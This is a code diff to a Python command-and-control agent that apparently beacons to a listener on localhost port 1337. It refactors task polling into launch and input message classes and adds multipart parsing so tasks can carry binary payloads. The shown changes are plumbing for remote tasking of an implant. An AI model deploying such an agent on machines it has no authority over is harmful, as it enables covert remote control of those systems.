@@ -1,4 +1,5 @@
 import ctypes
+import email
 import getpass
 import json
 import locale
@@ -14,6 +15,7 @@ import urllib.error
 import urllib.request
 import uuid
 import zlib
+from email import policy
 
 REMOTE_HOST = "127.0.0.1"
 REMOTE_PORT = 1337
@@ -128,10 +130,7 @@ def ping_capability(context):
         success=True,
     )
     for _ in range(context.arguments["iterations"]):
-        ping = context.connection.get_task_message_from_listener()
-        while not ping:
-            time.sleep(1)
-            ping = context.connection.get_task_message_from_listener()
+        context.connection.get_task_input_message_from_listener()
         context.connection.post_task_message_to_listener(
             task_id=context.task_id,
             success=True,
@@ -494,12 +493,28 @@ def sleep_random(sleep_time, sleep_time_jitter):
     time.sleep(time_to_sleep)
 
 
-class CapabilityContext:
-    def __init__(self, task_id, command, arguments, data, connection):
+class TaskLaunchMessage:
+    def __init__(self, task_id, command, arguments, data, payload):
         self.task_id = task_id
         self.command = command
-        self.arguments = arguments if arguments is not None else {}
-        self.data = data if data is not None else {}
+        self.arguments = arguments
+        self.data = data
+        self.payload = payload
+
+
+class TaskInputMessage:
+    def __init__(self, task_id, data, payload):
+        self.task_id = task_id
+        self.data = data
+        self.payload = payload
+
+
+class CapabilityContext:
+    def __init__(self, task_launch_message, connection):
+        self.task_id = task_launch_message.task_id
+        self.command = task_launch_message.command
+        self.arguments = task_launch_message.arguments
+        self.data = task_launch_message.data
         self.connection = connection
 
 
@@ -637,7 +652,7 @@ class Connection:
         self._agent_id = agent_id
         return agent_id
 
-    def get_task_message_from_listener(self):
+    def _get_task_message_from_listener(self):
         if self._agent_id is None:
             raise RuntimeError("Agent not registered with listener")
 
@@ -646,14 +661,78 @@ class Connection:
             headers={"Cookie": self._agent_id, **EXTRA_HEADERS},
         )
         while True:
-            task_message_response = (
-                urllib.request.urlopen(get_task_message_request).read().decode()
-            )
-            if not task_message_response:
-                sleep_random(self.sleep_time, self.sleep_time_jitter)
-                continue
-            task_message_json = json.loads(task_message_response)
+            with urllib.request.urlopen(get_task_message_request) as resp:
+                if resp.status != 200:
+                    sleep_random(self.sleep_time, self.sleep_time_jitter)
+                    continue
+
+                body = resp.read()
+                content_type = (
+                    resp.headers.get_content_type()
+                )  # 'application/json' or 'multipart/mixed'
+
+                if content_type == "application/json":
+                    task_message_json = json.loads(body)
+                    payload = None
+                elif content_type.startswith("multipart/"):
+                    # body alone has no headers, so prepend the Content-Type line
+                    # (with boundary) that the email parser needs to split parts
+                    header = (
+                        f"Content-Type: {resp.headers['Content-Type']}\r\n\r\n".encode(
+                            "ascii"
+                        )
+                    )
+                    msg = email.message_from_bytes(header + body, policy=policy.default)
+
+                    task_message_json = None
+                    payload = None
+                    for part in msg.iter_parts():
+                        name = part.get_param("name", header="Content-Disposition")
+                        if name == "json":
+                            task_message_json = json.loads(
+                                part.get_payload(decode=True)
+                            )
+                        elif name == "payload":
+                            payload = part.get_payload(decode=True)
+                        else:
+                            raise RuntimeError(f"Unexpected part name: {name}")
+                else:
+                    raise ValueError(f"Unexpected content type: {content_type}")
+
             logging.debug(f"GET {task_message_json}", task_message_json)  # DEBUG
+            if "command" in task_message_json and "arguments" in task_message_json:
+                return TaskLaunchMessage(
+                    task_message_json["task_id"],
+                    task_message_json["command"],
+                    task_message_json["arguments"],
+                    task_message_json["data"],
+                    payload,
+                )
+
+            return TaskInputMessage(
+                task_message_json["task_id"],
+                task_message_json["data"],
+                payload,
+            )
+
+    def get_task_message_from_listener(self):
+        return self._get_task_message_from_listener()
+
+    def get_task_launch_message_from_listener(self):
+        task_message = self._get_task_message_from_listener()
+        if not isinstance(task_message, TaskLaunchMessage):
+            raise TypeError(
+                f"Expected TaskLaunchMessage but received {type(task_message).__name__}"
+            )
+        return task_message
+
+    def get_task_input_message_from_listener(self):
+        task_message = self._get_task_message_from_listener()
+        if not isinstance(task_message, TaskInputMessage):
+            raise TypeError(
+                f"Expected TaskInputMessage but received {type(task_message).__name__}"
+            )
+        return task_message
 
     def post_task_message_to_listener(
         self, task_id, success, message="", data=None, payload=None
@@ -811,15 +890,12 @@ class Agent:
 
                 while True:
                     task_launch_message = (
-                        self.connection.get_task_message_from_listener()
+                        self.connection.get_task_launch_message_from_listener()
                     )
                     disconnect = False
-                    command = task_launch_message["command"]
+                    command = task_launch_message.command
                     capability_context = CapabilityContext(
-                        task_id=task_launch_message["task_id"],
-                        command=command,
-                        arguments=task_launch_message["arguments"],
-                        data=task_launch_message["data"],
+                        task_launch_message=task_launch_message,
                         connection=self.connection,
                     )
 
